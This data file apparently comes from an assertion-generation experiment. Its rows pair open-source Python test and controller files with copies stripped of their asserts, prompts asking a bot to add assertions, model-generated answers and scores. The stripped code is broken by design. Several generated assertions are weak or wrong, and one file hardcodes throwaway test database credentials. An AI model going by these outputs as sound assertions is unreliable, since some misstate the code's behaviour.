128            url(r'^$', NonAtomicAPIExceptionView.as_view()),
129        )
130
131    def setUp(self):
132        connections.databases['default']['ATOMIC_REQUESTS'] = True
133
134    def tearDown(self):
135        connections.databases['default']['ATOMIC_REQUESTS'] = False
136
137    def test_api_exception_rollback_transaction_non_atomic_view(self):
138        response = self.client.get('/')
139
140        # without checking connection.in_atomic_block view raises 500
141        # due attempt to rollback without transaction
142                         status.HTTP_404_NOT_FOUND)
143","[['BasicModel.objects.count()', '==', '1'], ['BasicModel.objects.count()', '==', '1'], ['BasicModel.objects.count()', '==', '0']]",13,3,0.2307692307692307,0.0005758157389635,"['factory', 'request', '*args', '**kwargs', 'self.view', ""connections.databases['default']['ATOMIC_REQUESTS']"", 'response', 'num_queries']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['factory', 'request', '*args', '**kwargs', 'self.view', ""connections.databases['default']['ATOMIC_REQUESTS']"", 'response', 'num_queries']
*Code:

1from __future__ import unicode_literals
2
3import unittest
4
5from django.conf.urls import url
6from django.db import connection, connections, transaction
7from django.http import Http404
8from django.test import TestCase, TransactionTestCase
9from django.utils.decorators import method_decorator
10
11from rest_framework import status
12from rest_framework.exceptions import APIException
13from rest_framework.response import Response
14from rest_framework.test import APIRequestFactory
15from rest_framework.views import APIView
16from tests.models import BasicModel
17
18factory = APIRequestFactory()
19
20
21class BasicView(APIView):
22    def post(self, request, *args, **kwargs):
23        BasicModel.objects.create()
24        return Response({'method': 'GET'})
25
26
27class ErrorView(APIView):
28    def post(self, request, *args, **kwargs):
29        BasicModel.objects.create()
30        raise Exception
31
32
33class APIExceptionView(APIView):
34    def post(self, request, *args, **kwargs):
35        BasicModel.objects.create()
36        raise APIException
37
38
39@unittest.skipUnless(
40    connection.features.uses_savepoints,
41    ""'atomic' requires transactions and savepoints.""
42)
43class DBTransactionTests(TestCase):
44    def setUp(self):
45        self.view = BasicView.as_view()
46        connections.databases['default']['ATOMIC_REQUESTS'] = True
47
48    def tearDown(self):
49        connections.databases['default']['ATOMIC_REQUESTS'] = False
50
51    def test_no_exception_commit_transaction(self):
52        request = factory.post('/')
53
54            response = self.view(request)
55
56
57@unittest.skipUnless(
58    connection.features.uses_savepoints,
59    ""'atomic' requires transactions and savepoints.""
60)
61class DBTransactionErrorTests(TestCase):
62    def setUp(self):
63        self.view = ErrorView.as_view()
64        connections.databases['default']['ATOMIC_REQUESTS'] = True
65
66    def tearDown(self):
67        connections.databases['default']['ATOMIC_REQUESTS'] = False
68
69    def test_generic_exception_delegate_transaction_management(self):
70        """"""
71        Transaction is eventually managed by outer-most transaction atomic
72        block. DRF do not try to interfere here.
73
74        We let django deal with the transaction when it will catch the Exception.
75        """"""
76        request = factory.post('/')
77            # 1 - begin savepoint
78            # 2 - insert
79            # 3 - release savepoint
80            with transaction.atomic():
81
82
83@unittest.skipUnless(
84    connection.features.uses_savepoints,
85    ""'atomic' requires transactions and savepoints.""
86)
87class DBTransactionAPIExceptionTests(TestCase):
88    def setUp(self):
89        self.view = APIExceptionView.as_view()
90        connections.databases['default']['ATOMIC_REQUESTS'] = True
91
92    def tearDown(self):
93        connections.databases['default']['ATOMIC_REQUESTS'] = False
94
95    def test_api_exception_rollback_transaction(self):
96        """"""
97        Transaction is rollbacked by our transaction atomic block.
98        """"""
99        request = factory.post('/')
100        num_queries = (4 if getattr(connection.features,
101                                    'can_release_savepoints', False) else 3)
102            # 1 - begin savepoint
103            # 2 - insert
104            # 3 - rollback savepoint
105            # 4 - release savepoint (django>=1.8 only)
106            with transaction.atomic():
107                response = self.view(request)
108                         status.HTTP_500_INTERNAL_SERVER_ERROR)
109
110
111@unittest.skipUnless(
112    connection.features.uses_savepoints,
113    ""'atomic' requires transactions and savepoints.""
114)
115class NonAtomicDBTransactionAPIExceptionTests(TransactionTestCase):
116    @property
117    def urls(self):
118        class NonAtomicAPIExceptionView(APIView):
119            @method_decorator(transaction.non_atomic_requests)
120            def dispatch(self, *args, **kwargs):
121                return super(NonAtomicAPIExceptionView, self).dispatch(*args, **kwargs)
122
123            def get(self, request, *args, **kwargs):
124                BasicModel.objects.all()
125                raise Http404
126
127        return (
128            url(r'^$', NonAtomicAPIExceptionView.as_view()),
129        )
130
131    def setUp(self):
132        connections.databases['default']['ATOMIC_REQUESTS'] = True
133
134    def tearDown(self):
135        connections.databases['default']['ATOMIC_REQUESTS'] = False
136
137    def test_api_exception_rollback_transaction_non_atomic_view(self):
138        response = self.client.get('/')
139
140        # without checking connection.in_atomic_block view raises 500
141        # due attempt to rollback without transaction
142                         status.HTTP_404_NOT_FOUND)
143",6382,"[[18, 'factory', '!=', None, ""APIRequestFactory instance creation should be successful""],
[52, 'request', '!=', None, ""Every API post request should be successful""],
[54, 'response', '!=', None, ""Every API post request should receive a response""],
[76, 'request', '!=', None, ""Every API post request should be successful""],
[99, 'request', '!=', None, ""Every API post request should be successful""],
[99, 'num_queries', '==', 4, ""Number of queries expected should be 4 given can_release_savepoints is true""],
[107, 'response', '!=', None, ""Every API post request should receive a response""],
[138, 'response', '!=', None, ""Every API get request should receive a response""]]"
mlabru/ptracks,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
""""""
---------------------------------------------------------------------------------------------------
control_wizard

this main class load from one configuration file (default tracks.cfg) all the configured tables
and start the editor

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

revision 0.2  2015/nov  mlabru
pep8 style conventions

revision 0.1  2014/nov  mlabru
initial release (Linux/Python)
---------------------------------------------------------------------------------------------------
""""""
__version__ = ""$revision: 0.2$""
__author__ = ""Milton Abrunhosa""
__date__ = ""2015/11""

# < imports >--------------------------------------------------------------------------------------

# model 
import model.wizard.model_wizard as model

# view 
import view.wizard.view_wizard as view

# control 
import control.control_manager as control

import control.config.config_wizard as config

# < class CControlWizard >-------------------------------------------------------------------------

class CControlWizard(control.CControlManager):
    """"""
    controller do configuration wizard
    coordena as comunicações entre o modelo, as views e controle usando eventos
    """"""
    # ---------------------------------------------------------------------------------------------
    def __init__(self):
        """"""
        inicia o módulo controller do configuration wizard
        """"""
        # init super class
        super(CControlWizard, self).__init__()

        # herdados de CControlManager
        # self.config    # opções de configuração
        # self.event     # event manager
        # self.model     # model manager
        # self.view      # view manager
        # self.voip      # biblioteca de VoIP

        # carrega o arquivo com as opções de configuração
        self.config = config.CConfigWizard(""tracks.cfg"")
        assert self.config

        # obtém o dicionário de configuração
        # self.__dct_config = self.config.dct_config
        # assert self.__dct_config

        # instancia o model
        self.model = model.CModelWizard(self)
        assert self.model

        # instancia a view
        self.view = view.CViewWizard(self)
        assert self.view

# < the end >--------------------------------------------------------------------------------------
","
1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3""""""
4---------------------------------------------------------------------------------------------------
5control_wizard
6
7this main class load from one configuration file (default tracks.cfg) all the configured tables
8and start the editor
9
10This program is free software: you can redistribute it and/or modify
11it under the terms of the GNU General Public License as published by
12the Free Software Foundation, either version 3 of the License, or
13(at your option) any later version.
14
15This program is distributed in the hope that it will be useful,
16but WITHOUT ANY WARRANTY; without even the implied warranty of
17MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
18GNU General Public License for more details.
19
20You should have received a copy of the GNU General Public License
21along with this program.  If not, see <http://www.gnu.org/licenses/>.
22
23revision 0.2  2015/nov  mlabru
24pep8 style conventions
25
26revision 0.1  2014/nov  mlabru
27initial release (Linux/Python)
28---------------------------------------------------------------------------------------------------
29""""""
30__version__ = ""$revision: 0.2$""
31__author__ = ""Milton Abrunhosa""
32__date__ = ""2015/11""
33
34# < imports >--------------------------------------------------------------------------------------
35
36# model 
37import model.wizard.model_wizard as model
38
39# view 
40import view.wizard.view_wizard as view
41
42# control 
43import control.control_manager as control
44
45import control.config.config_wizard as config
46
47# < class CControlWizard >-------------------------------------------------------------------------
48
49class CControlWizard(control.CControlManager):
50    """"""
51    controller do configuration wizard
52    coordena as comunicações entre o modelo, as views e controle usando eventos
53    """"""
54    # ---------------------------------------------------------------------------------------------
55    def __init__(self):
56        """"""
57        inicia o módulo controller do configuration wizard
58        """"""
59        # init super class
60        super(CControlWizard, self).__init__()
61
62        # herdados de CControlManager
63        # self.config    # opções de configuração
64        # self.event     # event manager
65        # self.model     # model manager
66        # self.view      # view manager
67        # self.voip      # biblioteca de VoIP
68
69        # carrega o arquivo com as opções de configuração
70        self.config = config.CConfigWizard(""tracks.cfg"")
71
72        # obtém o dicionário de configuração
73        # self.__dct_config = self.config.dct_config
74
75        # instancia o model
76        self.model = model.CModelWizard(self)
77
78        # instancia a view
79        self.view = view.CViewWizard(self)
80
81# < the end >--------------------------------------------------------------------------------------
82","[['self.config', '==', 'True'], ['self.model', '==', 'True'], ['self.view', '==', 'True']]",4,3,0.75,0.0010337698139214,"['__version__', '__author__', '__date__', 'self.config', '# self.__dct_config', 'self.model', 'self.view']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__version__', '__author__', '__date__', 'self.config', '# self.__dct_config', 'self.model', 'self.view']
*Code:

1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3""""""
4---------------------------------------------------------------------------------------------------
5control_wizard
6
7this main class load from one configuration file (default tracks.cfg) all the configured tables
8and start the editor
9
10This program is free software: you can redistribute it and/or modify
11it under the terms of the GNU General Public License as published by
12the Free Software Foundation, either version 3 of the License, or
13(at your option) any later version.
14
15This program is distributed in the hope that it will be useful,
16but WITHOUT ANY WARRANTY; without even the implied warranty of
17MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
18GNU General Public License for more details.
19
20You should have received a copy of the GNU General Public License
21along with this program.  If not, see <http://www.gnu.org/licenses/>.
22
23revision 0.2  2015/nov  mlabru
24pep8 style conventions
25
26revision 0.1  2014/nov  mlabru
27initial release (Linux/Python)
28---------------------------------------------------------------------------------------------------
29""""""
30__version__ = ""$revision: 0.2$""
31__author__ = ""Milton Abrunhosa""
32__date__ = ""2015/11""
33
34# < imports >--------------------------------------------------------------------------------------
35
36# model 
37import model.wizard.model_wizard as model
38
39# view 
40import view.wizard.view_wizard as view
41
42# control 
43import control.control_manager as control
44
45import control.config.config_wizard as config
46
47# < class CControlWizard >-------------------------------------------------------------------------
48
49class CControlWizard(control.CControlManager):
50    """"""
51    controller do configuration wizard
52    coordena as comunicações entre o modelo, as views e controle usando eventos
53    """"""
54    # ---------------------------------------------------------------------------------------------
55    def __init__(self):
56        """"""
57        inicia o módulo controller do configuration wizard
58        """"""
59        # init super class
60        super(CControlWizard, self).__init__()
61
62        # herdados de CControlManager
63        # self.config    # opções de configuração
64        # self.event     # event manager
65        # self.model     # model manager
66        # self.view      # view manager
67        # self.voip      # biblioteca de VoIP
68
69        # carrega o arquivo com as opções de configuração
70        self.config = config.CConfigWizard(""tracks.cfg"")
71
72        # obtém o dicionário de configuração
73        # self.__dct_config = self.config.dct_config
74
75        # instancia o model
76        self.model = model.CModelWizard(self)
77
78        # instancia a view
79        self.view = view.CViewWizard(self)
80
81# < the end >--------------------------------------------------------------------------------------
82",4431,"[[70, 'self.config', '!=', None, ""config object should be initialized""],
 [76, 'self.model', '!=', None, ""model object should be initialized""],
 [79, 'self.view', '!=', None, ""view object should be initialized""]]"
bm5w/learning-journal,"from lettuce import step
from lettuce import world
from lettuce import before
import re
from contextlib import closing
import psycopg2

ON_MATTS = ""C:\\Users\\jefimenko\\""

################################
# Steps for adding entries
################################
@step(u'the new page and the content (\w+)')
def new_page(step, tt):
    # from main page go to new page
    world.list_view = world.app.get('/')
    soup = world.list_view.html
    query = soup.find_all('a', text=""New"")
    world.link = query[0].get('href')
    world.new_page = world.app.get(world.link)

    # add content to form on new page
    world.form = world.new_page.form
    world.form['title'] = tt
    world.form['text'] = '```python\n{}\n```'.format(tt)


@step(u'I click on the post button')
def click_post(step):
    world.new_page_detail = world.form.submit('submit').follow()


@step(u'Then I see the entry with the text (\w+)')
def compare_new(step, expected):
    assert expected in world.new_page_detail


################################
# Steps for testing detail view
################################


@step(u'a link (\w+)')
def the_entry(step, id):
    world.list_view = world.app.get('/')
    soup = world.list_view.html
    query = soup.find_all('a', 'detail', href=re.compile(""/{}"".format(id)))
    world.link = query[0].get('href')


@step(u'I click on an entry link')
def call_detail_view(step):
    world.detail_view = world.app.get(world.link)


@step(u'I see one entry in detail (\w+)')
def compare(step, expected):
    assert expected in world.detail_view


################################
# Steps for testing edit feature
################################


@step(u'I want to add (\w\w\w) to a specific entry, (\d)')
def add_foo(step, edit, id):
    world.edit = edit
    world.entry_id = id


@step(u'edit and update an entry')
def edit_update(step):
    # navigate from detail to edit page
    world.list_view = world.app.get('/')
    soup = world.list_view.html
    query = soup.find_all('a', href=re.compile(""detail/{}"".format(world.entry_id)))

    world.link = query[0].get('href')

    world.detail_page = world.app.get(world.link)
    soup = world.detail_page.html
    query = soup.find_all('a', text=""Edit"")

    world.link = query[0].get('href')

    world.edit_page = world.app.get(world.link)

    # get form from page, add title and text, submit and follow link
    world.form = world.edit_page.form
    world.form['title'] = world.edit
    world.form['text'] = """"""```python\nfoot\n```""""""
    world.updated_detail_page = world.form.submit('submit').follow()


@step(u'I see the change in its detail page, (\w+)')
def check_add(step, expected):
    assert expected in world.updated_detail_page.body


################################
# Steps for testing hilite feature
################################

@step(u'a detail page (\d)')
def get_detail(step, id):
    world.list_view = world.app.get('/')
    soup = world.list_view.html
    query = soup.find_all('a', 'detail', href=re.compile(""/{}"".format(id)))
    world.link = query[0].get('href')


@step(u'view it')
def view_detail(step):
    world.body = world.app.get(world.link).html


@step(u'I see markdown as html and code colorized (\w+)')
def check_add(step, expected):
    query = world.body.find('div', 'codehilite')
    assert query is not None


LOCAL_DSN = 'dbname=learning-journal user=mark'
# For running on Matt's machine
MATTLEE = 'dbname=test-learning-journal user=postgres password=admin'

TRAVIS = 'dbname=travis_ci_test user=postgres'
DB_SCHEMA = """"""
CREATE TABLE IF NOT EXISTS entries (
    id serial PRIMARY KEY,
    title VARCHAR (127) NOT NULL,
    text TEXT NOT NULL,
    created TIMESTAMP NOT NULL
)
""""""


# connect to the db
def connect_db(settings):
    """"""Return a connection to the configured database""""""
    return psycopg2.connect(settings['db'])


# Fixture for webtest
@before.all
def app():
    from journal import main
    from webtest import TestApp
    import os

    # settings = {'db': LOCAL_DSN}

    # os.environ['DATABASE_URL'] = TRAVIS
    app = main()
    world.app = TestApp(app)
    settings = {}

    settings['db'] = TRAVIS

    # if ON_MATTS == os.path.abspath('~'):
    os.environ['DATABASE_URL'] = MATTLEE
    settings['db'] = MATTLEE

    print os.environ['DATABASE_URL']
    print settings['db']

    with closing(connect_db(settings)) as db:
        db.cursor().execute(DB_SCHEMA)
        db.commit()

    # Login for testing editing
    login_data = {'username': 'admin', 'password': 'secret'}
    world.app.post('/login', params=login_data)
","
1from lettuce import step
2from lettuce import world
3from lettuce import before
4import re
5from contextlib import closing
6import psycopg2
7
8ON_MATTS = ""C:\\Users\\jefimenko\\""
9
10################################
11# Steps for adding entries
12################################
13@step(u'the new page and the content (\w+)')
14def new_page(step, tt):
15    # from main page go to new page
16    world.list_view = world.app.get('/')
17    soup = world.list_view.html
18    query = soup.find_all('a', text=""New"")
19    world.link = query[0].get('href')
20    world.new_page = world.app.get(world.link)
21
22    # add content to form on new page
23    world.form = world.new_page.form
24    world.form['title'] = tt
25    world.form['text'] = '```python\n{}\n```'.format(tt)
26
27
28@step(u'I click on the post button')
29def click_post(step):
30    world.new_page_detail = world.form.submit('submit').follow()
31
32
33@step(u'Then I see the entry with the text (\w+)')
34def compare_new(step, expected):
35
36
37################################
38# Steps for testing detail view
39################################
40
41
42@step(u'a link (\w+)')
43def the_entry(step, id):
44    world.list_view = world.app.get('/')
45    soup = world.list_view.html
46    query = soup.find_all('a', 'detail', href=re.compile(""/{}"".format(id)))
47    world.link = query[0].get('href')
48
49
50@step(u'I click on an entry link')
51def call_detail_view(step):
52    world.detail_view = world.app.get(world.link)
53
54
55@step(u'I see one entry in detail (\w+)')
56def compare(step, expected):
57
58
59################################
60# Steps for testing edit feature
61################################
62
63
64@step(u'I want to add (\w\w\w) to a specific entry, (\d)')
65def add_foo(step, edit, id):
66    world.edit = edit
67    world.entry_id = id
68
69
70@step(u'edit and update an entry')
71def edit_update(step):
72    # navigate from detail to edit page
73    world.list_view = world.app.get('/')
74    soup = world.list_view.html
75    query = soup.find_all('a', href=re.compile(""detail/{}"".format(world.entry_id)))
76
77    world.link = query[0].get('href')
78
79    world.detail_page = world.app.get(world.link)
80    soup = world.detail_page.html
81    query = soup.find_all('a', text=""Edit"")
82
83    world.link = query[0].get('href')
84
85    world.edit_page = world.app.get(world.link)
86
87    # get form from page, add title and text, submit and follow link
88    world.form = world.edit_page.form
89    world.form['title'] = world.edit
90    world.form['text'] = """"""```python\nfoot\n```""""""
91    world.updated_detail_page = world.form.submit('submit').follow()
92
93
94@step(u'I see the change in its detail page, (\w+)')
95def check_add(step, expected):
96
97
98################################
99# Steps for testing hilite feature
100################################
101
102@step(u'a detail page (\d)')
103def get_detail(step, id):
104    world.list_view = world.app.get('/')
105    soup = world.list_view.html
106    query = soup.find_all('a', 'detail', href=re.compile(""/{}"".format(id)))
107    world.link = query[0].get('href')
108
109
110@step(u'view it')
111def view_detail(step):
112    world.body = world.app.get(world.link).html
113
114
115@step(u'I see markdown as html and code colorized (\w+)')
116def check_add(step, expected):
117    query = world.body.find('div', 'codehilite')
118
119
120LOCAL_DSN = 'dbname=learning-journal user=mark'
121# For running on Matt's machine
122MATTLEE = 'dbname=test-learning-journal user=postgres password=admin'
123
124TRAVIS = 'dbname=travis_ci_test user=postgres'
125DB_SCHEMA = """"""
126CREATE TABLE IF NOT EXISTS entries (
127    id serial PRIMARY KEY,
128    title VARCHAR (127) NOT NULL,
129    text TEXT NOT NULL,
130    created TIMESTAMP NOT NULL
131)
132""""""
133
134
135# connect to the db
136def connect_db(settings):
137    """"""Return a connection to the configured database""""""
138    return psycopg2.connect(settings['db'])
139
140
141# Fixture for webtest
142@before.all
143def app():
144    from journal import main
145    from webtest import TestApp
146    import os
147
148    # settings = {'db': LOCAL_DSN}
149
150    # os.environ['DATABASE_URL'] = TRAVIS
151    app = main()
152    world.app = TestApp(app)
153    settings = {}
154
155    settings['db'] = TRAVIS
156
157    # if ON_MATTS == os.path.abspath('~'):
158    os.environ['DATABASE_URL'] = MATTLEE
159    settings['db'] = MATTLEE
160
161    print os.environ['DATABASE_URL']
162    print settings['db']
163
164    with closing(connect_db(settings)) as db:
165        db.cursor().execute(DB_SCHEMA)
166        db.commit()
167
168    # Login for testing editing
169    login_data = {'username': 'admin', 'password': 'secret'}
170    world.app.post('/login', params=login_data)
171","[['query', '==', 'not None']]",4,1,0.25,0.0002192021043402,"['ON_MATTS', 'step', 'tt', 'world.list_view', 'soup', 'query', 'world.link', 'world.new_page', 'world.form', ""world.form['title']"", ""world.form['text']"", 'world.new_page_detail', 'expected', 'id', 'world.detail_view', 'edit', 'world.edit', 'world.entry_id', 'world.detail_page', 'world.edit_page', 'world.updated_detail_page', 'world.body', 'LOCAL_DSN', 'MATTLEE', 'TRAVIS', 'DB_SCHEMA', 'settings', '# settings', ""# os.environ['DATABASE_URL']"", 'app', 'world.app', ""settings['db']"", ""os.environ['DATABASE_URL']"", 'login_data']",34,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['ON_MATTS', 'step', 'tt', 'world.list_view', 'soup', 'query', 'world.link', 'world.new_page', 'world.form', ""world.form['title']"", ""world.form['text']"", 'world.new_page_detail', 'expected', 'id', 'world.detail_view', 'edit', 'world.edit', 'world.entry_id', 'world.detail_page', 'world.edit_page', 'world.updated_detail_page', 'world.body', 'LOCAL_DSN', 'MATTLEE', 'TRAVIS', 'DB_SCHEMA', 'settings', '# settings', ""# os.environ['DATABASE_URL']"", 'app', 'world.app', ""settings['db']"", ""os.environ['DATABASE_URL']"", 'login_data']
*Code:

1from lettuce import step
2from lettuce import world
3from lettuce import before
4import re
5from contextlib import closing
6import psycopg2
7
8ON_MATTS = ""C:\\Users\\jefimenko\\""
9
10################################
11# Steps for adding entries
12################################
13@step(u'the new page and the content (\w+)')
14def new_page(step, tt):
15    # from main page go to new page
16    world.list_view = world.app.get('/')
17    soup = world.list_view.html
18    query = soup.find_all('a', text=""New"")
19    world.link = query[0].get('href')
20    world.new_page = world.app.get(world.link)
21
22    # add content to form on new page
23    world.form = world.new_page.form
24    world.form['title'] = tt
25    world.form['text'] = '```python\n{}\n```'.format(tt)
26
27
28@step(u'I click on the post button')
29def click_post(step):
30    world.new_page_detail = world.form.submit('submit').follow()
31
32
33@step(u'Then I see the entry with the text (\w+)')
34def compare_new(step, expected):
35
36
37################################
38# Steps for testing detail view
39################################
40
41
42@step(u'a link (\w+)')
43def the_entry(step, id):
44    world.list_view = world.app.get('/')
45    soup = world.list_view.html
46    query = soup.find_all('a', 'detail', href=re.compile(""/{}"".format(id)))
47    world.link = query[0].get('href')
48
49
50@step(u'I click on an entry link')
51def call_detail_view(step):
52    world.detail_view = world.app.get(world.link)
53
54
55@step(u'I see one entry in detail (\w+)')
56def compare(step, expected):
57
58
59################################
60# Steps for testing edit feature
61################################
62
63
64@step(u'I want to add (\w\w\w) to a specific entry, (\d)')
65def add_foo(step, edit, id):
66    world.edit = edit
67    world.entry_id = id
68
69
70@step(u'edit and update an entry')
71def edit_update(step):
72    # navigate from detail to edit page
73    world.list_view = world.app.get('/')
74    soup = world.list_view.html
75    query = soup.find_all('a', href=re.compile(""detail/{}"".format(world.entry_id)))
76
77    world.link = query[0].get('href')
78
79    world.detail_page = world.app.get(world.link)
80    soup = world.detail_page.html
81    query = soup.find_all('a', text=""Edit"")
82
83    world.link = query[0].get('href')
84
85    world.edit_page = world.app.get(world.link)
86
87    # get form from page, add title and text, submit and follow link
88    world.form = world.edit_page.form
89    world.form['title'] = world.edit
90    world.form['text'] = """"""```python\nfoot\n```""""""
91    world.updated_detail_page = world.form.submit('submit').follow()
92
93
94@step(u'I see the change in its detail page, (\w+)')
95def check_add(step, expected):
96
97
98################################
99# Steps for testing hilite feature
100################################
101
102@step(u'a detail page (\d)')
103def get_detail(step, id):
104    world.list_view = world.app.get('/')
105    soup = world.list_view.html
106    query = soup.find_all('a', 'detail', href=re.compile(""/{}"".format(id)))
107    world.link = query[0].get('href')
108
109
110@step(u'view it')
111def view_detail(step):
112    world.body = world.app.get(world.link).html
113
114
115@step(u'I see markdown as html and code colorized (\w+)')
116def check_add(step, expected):
117    query = world.body.find('div', 'codehilite')
118
119
120LOCAL_DSN = 'dbname=learning-journal user=mark'
121# For running on Matt's machine
122MATTLEE = 'dbname=test-learning-journal user=postgres password=admin'
123
124TRAVIS = 'dbname=travis_ci_test user=postgres'
125DB_SCHEMA = """"""
126CREATE TABLE IF NOT EXISTS entries (
127    id serial PRIMARY KEY,
128    title VARCHAR (127) NOT NULL,
129    text TEXT NOT NULL,
130    created TIMESTAMP NOT NULL
131)
132""""""
133
134
135# connect to the db
136def connect_db(settings):
137    """"""Return a connection to the configured database""""""
138    return psycopg2.connect(settings['db'])
139
140
141# Fixture for webtest
142@before.all
143def app():
144    from journal import main
145    from webtest import TestApp
146    import os
147
148    # settings = {'db': LOCAL_DSN}
149
150    # os.environ['DATABASE_URL'] = TRAVIS
151    app = main()
152    world.app = TestApp(app)
153    settings = {}
154
155    settings['db'] = TRAVIS
156
157    # if ON_MATTS == os.path.abspath('~'):
158    os.environ['DATABASE_URL'] = MATTLEE
159    settings['db'] = MATTLEE
160
161    print os.environ['DATABASE_URL']
162    print settings['db']
163
164    with closing(connect_db(settings)) as db:
165        db.cursor().execute(DB_SCHEMA)
166        db.commit()
167
168    # Login for testing editing
169    login_data = {'username': 'admin', 'password': 'secret'}
170    world.app.post('/login', params=login_data)
171",6706,"[[14, 'tt', '!=', None, 'new_page function requires a non-null input'],
[28, 'step', '!=', None, 'click_post function requires a non-null input'],
[33, 'expected', '!=', None, 'compare_new function requires a non-null expected input'],
[42, 'id', '!=', None, 'the_entry function requires a non-null id input'],
[50, 'step', '!=', None, 'call_detail_view function requires a non-null input'],
[55, 'expected', '!=', None, 'compare function requires a non-null expected input'],
[64, 'edit', '!=', None, 'add_foo function requires a non-null edit input'],
[64, 'id', '!=', None, 'add_foo function requires a non-null id input'],
[70, 'step', '!=', None, 'edit_update function requires a non-null input'],
[94, 'expected', '!=', None, 'check_add function requires a non-null expected input'],
[102, 'id', '!=', None, 'get_detail function requires a non-null id input'],
[110, 'step', '!=', None, 'view_detail function requires a non-null input'],
[115, 'expected', '!=', None, 'check_add function requires a non-null expected input'],
[136, ""settings['db']"", '!=', None, 'connect_db function requires a non-null database setting input'],
[143, 'app', '!=', None, 'app function requires a non-null input']]"
kprestel/PyInvestment,"import pytest
from pytech.backtest.event import (Event, MarketEvent, SignalEvent, TradeEvent,
                                   FillEvent)
from pytech.utils.enums import EventType, SignalType, OrderType


class TestMarketEvent(object):

    def test_market_event(self):
        market_event = MarketEvent()
        assert market_event.event_type is EventType.MARKET
        assert issubclass(market_event.__class__, Event)

    def test_signal_event(self):
        signal_event = SignalEvent('AAPL', SignalType.LONG,
                                   target_price=101.22)
        assert signal_event.event_type is EventType.SIGNAL
        assert signal_event.signal_type is SignalType.LONG
        assert signal_event.ticker == 'AAPL'
        assert signal_event.target_price == 101.22
        assert signal_event.order_type is OrderType.MARKET
        assert isinstance(signal_event, SignalEvent)
        assert issubclass(signal_event.__class__, Event)

    def test_trade_event(self):
        trade_event = TradeEvent('one', 111.11, 2, '2017-03-18')
        assert trade_event.event_type is EventType.TRADE
        assert trade_event.qty == 2
        assert issubclass(trade_event.__class__, Event)

    def test_fill_event(self):
        fill_event = FillEvent('one', 112.11, 500, '2017-03-18')
        assert fill_event.event_type is EventType.FILL
        assert fill_event.price == 112.11
        assert fill_event.available_volume == 500
        assert issubclass(fill_event.__class__, Event)

    def test_event_from_dict(self):

        signal_event_dict = {
            'ticker': 'AAPL',
            'dt': '2017-03-18',
            'signal_type': 'SHORT',
            'limit_price': 124.11,
            'upper_price': 160.11,
            'action': 'SELL',
            'junk': 'more junk'
        }

        signal_event = SignalEvent.from_dict(signal_event_dict)
        assert isinstance(signal_event, SignalEvent)
        assert signal_event.ticker == 'AAPL'
        assert signal_event.signal_type is SignalType.SHORT

","
1import pytest
2from pytech.backtest.event import (Event, MarketEvent, SignalEvent, TradeEvent,
3                                   FillEvent)
4from pytech.utils.enums import EventType, SignalType, OrderType
5
6
7class TestMarketEvent(object):
8
9    def test_market_event(self):
10        market_event = MarketEvent()
11
12    def test_signal_event(self):
